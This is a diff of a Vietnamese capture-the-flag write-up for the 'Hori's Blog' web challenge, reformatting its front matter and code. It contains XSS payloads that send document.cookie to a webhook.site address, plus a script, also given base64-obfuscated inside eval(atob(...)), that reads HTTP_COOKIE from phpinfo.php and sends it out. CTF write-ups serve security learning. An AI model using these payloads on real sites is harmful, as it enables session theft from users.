@@ -1,9 +1,13 @@
-
-# Description
-
-> flag in cookie and plz don't dirsearch
-> 
-> Author: bashu
+---
+title: "Hori's Blog"
+id: "Horis_Blog"
+author: "bashu"
+description: "flag in cookie and plz don't dirsearch"
+points: 50
+difficulty: "Easy"
+readTime: "2 min"
+date: "15-12-2025"
+---
 
 # TL;DR
 
@@ -27,7 +31,7 @@ Tuyệt vời XSS thành công ^^
 
 Sau đấy mình chỉ việc viết payload gửi cookie về webhook của mình là xong (hoặc là không)
 
-**Payload**: ``<script>fetch(`https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${document.cookie}`)</script>``
+**Payload**: `` <script>fetch(`https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${document.cookie}`)</script> ``
 
 ![](assets/gdfgregerg.png)
 
@@ -52,18 +56,27 @@ Thế nên mình chuyển hướng sang tìm cách khiến con bot fetch đoạn
 **Script lấy cookie**:
 
 ```javascript
-fetch('/phpinfo.php').then(r => r.text()).then(
-  r => {
+fetch("/phpinfo.php")
+  .then((r) => r.text())
+  .then((r) => {
     const i = r.indexOf("HTTP_COOKIE");
     const data = btoa(r.slice(i, i + 500)); // lấy 500 kí tự để tránh url quá dài
-    fetch(`https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${data}`);
-  }
-);
+    fetch(
+      `https://webhook.site/590bdf98-4b62-4539-b61e-4c2f034b8cdc/?data=${data}`
+    );
+  });
 ```
 
 **Payload** (mình encode lại để tránh khi render làm cho script bị lỗi):
+
 ```html
-<script>eval(atob('ZmV0Y2goJy9waHBpbmZvLnBocCcpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbigKICByID0+IHsKICAgIGNvbnN0IGkgPSByLmluZGV4T2YoIkhUVFBfQ09PS0lFIik7CiAgICBjb25zdCBkYXRhID0gYnRvYShyLnNsaWNlKGksIGkgKyA1MDApKTsKICAgIGZldGNoKGBodHRwczovL3dlYmhvb2suc2l0ZS81OTBiZGY5OC00YjYyLTQ1MzktYjYxZS00YzJmMDM0YjhjZGMvP2RhdGE9JHtkYXRhfWApOwogIH0KKTs='))</script>
+<script>
+  eval(
+    atob(
+      "ZmV0Y2goJy9waHBpbmZvLnBocCcpLnRoZW4ociA9PiByLnRleHQoKSkudGhlbigKICByID0+IHsKICAgIGNvbnN0IGkgPSByLmluZGV4T2YoIkhUVFBfQ09PS0lFIik7CiAgICBjb25zdCBkYXRhID0gYnRvYShyLnNsaWNlKGksIGkgKyA1MDApKTsKICAgIGZldGNoKGBodHRwczovL3dlYmhvb2suc2l0ZS81OTBiZGY5OC00YjYyLTQ1MzktYjYxZS00YzJmMDM0YjhjZGMvP2RhdGE9JHtkYXRhfWApOwogIH0KKTs="
+    )
+  );
+</script>
 ```
 
 ![](assets/gergergergfg.png)
